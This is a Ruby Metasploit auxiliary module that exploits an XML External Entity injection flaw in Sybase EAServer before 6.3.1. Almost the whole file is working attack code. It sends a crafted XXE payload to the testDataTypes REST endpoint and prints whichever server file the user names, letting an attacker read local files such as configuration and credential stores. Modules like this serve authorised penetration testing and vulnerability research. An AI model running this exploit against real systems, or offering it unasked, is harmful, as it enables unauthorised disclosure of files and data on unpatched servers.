##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Sybase XML External Entity Injection',
      'Description' => %q{ Multiple vulnerabilities Sybase EAServer < 6.3.1 -- XML External Entity Injection
      },
      'References'  =>
        [
          [ 'URL', 'https://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm' ],
        ],
      'Author'      => 'y3dips',
      'License'     => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new('FILE', [ true,  "File to read", 'C:']),
      ],self.class)
  end

  def run_host(ip)
    path = [
      "/rest/public/xml-1.0/testDataTypes"
    ]

    postrequest= "<\?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
    postrequest << "<\!DOCTYPE foo [<\!ENTITY xxe SYSTEM \"file:///#{datastore['FILE']}\">]>"
    postrequest << "<lol><dt><stringValue>&xxe;</stringValue><booleanValue>0</booleanValue></dt></lol>"
    
    path.each do | check |

      res = send_request_cgi({
        'uri'     => check,
        'method'  => 'POST',
        'version' => '1.1',
        'headers' => {'Content-Type' => 'text/xml'},
        'data'         => postrequest
      }, 25)

      if (res.nil?)
        print_error("no response for #{ip}:#{rport} #{check}")
      else
        print_status("#{res.body}")
      end
    end
  end   
end

#
